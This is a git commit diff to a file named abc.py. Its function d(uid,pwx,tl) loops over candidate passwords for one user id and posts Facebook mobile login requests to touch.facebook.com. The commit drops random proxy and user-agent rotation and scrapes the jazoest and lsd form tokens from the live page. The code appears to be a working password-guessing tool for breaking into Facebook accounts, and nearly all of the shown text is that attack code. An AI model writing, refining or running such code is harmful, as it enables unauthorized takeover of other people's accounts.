8cb66bfec276a19d0aa9562cc5c657f0fde097b8
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-12-17 19:12:06 +0530

    Update abc.py

--- abc.py
+++ abc.py
@@ -1733,9 +1733,6 @@ def d(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
-            ua = random.choice(uas)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
@@ -1752,8 +1749,8 @@ def d(uid,pwx,tl):
             '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew2io0D24o1MUaE1Do1u81x82ewnE3Mw4WwSyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jw',
             '__csr': '',
             'fb_dtsg': 'NAcOlfpCOM2BFnghClV_Fbk2SejAMCvE1gYRFgP4Eh4s03fmjrbDwEA:0:0',
-            'jazoest': '24865',
-            'lsd': 'AVqsfW-tGqM',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'params': json.dumps({"params": json.dumps({"server_params":{"credential_type":"password","username_text_input_id":"yzmero:69","password_text_input_id":"yzmero:70","login_source":"Login","login_credential_type":"none","server_login_source":"login","ar_event_source":"login_home_page","should_trigger_override_login_success_action":0,"should_trigger_override_login_2fa_action":0,"is_caa_perf_enabled":0,"reg_flow_source":"login_home_native_integration_point","caller":"gslr","is_from_landing_page":0,"is_from_empty_password":0,"is_from_password_entry_page":0,"is_from_assistive_id":0,"is_from_msplit_fallback":0,"INTERNALlatency_qpl_marker_id":36707139,"INTERNALlatency_qpl_instance_id":"211568211600414","device_id":None,"family_device_id":None,"waterfall_id":"9b12f14d-e937-4714-94bf-015a5d6b4db3","offline_experiment_group":None,"layered_homepage_experiment_group":None,"is_platform_login":0,"is_from_logged_in_switcher":0,"is_from_logged_out":0,"access_flow_version":"F2_FLOW"},"client_input_params":{"machine_id":"","contact_point":uid,"password":"#PWD_BROWSER:0:{}:{}".format(str(int(time.time())),pw),"accounts_list":[],"fb_ig_device_id":[],"secure_family_device_id":"","encrypted_msisdn":"","headers_infra_flow_id":"","try_num":1,"login_attempt_count":1,"event_flow":"login_manual","event_step":"home_page","openid_tokens":{},"auth_secure_device_id":"","client_known_key_hash":"","has_whatsapp_installed":0,"sso_token_map_json_string":"","should_show_nested_nta_from_aymh":0,"password_contains_non_ascii":"false","has_granted_read_contacts_permissions":0,"has_granted_read_phone_permissions":0,"app_manager_id":"","lois_settings":{"lois_token":"","lara_override":""}}})}),}
             print(data)
             headers = {
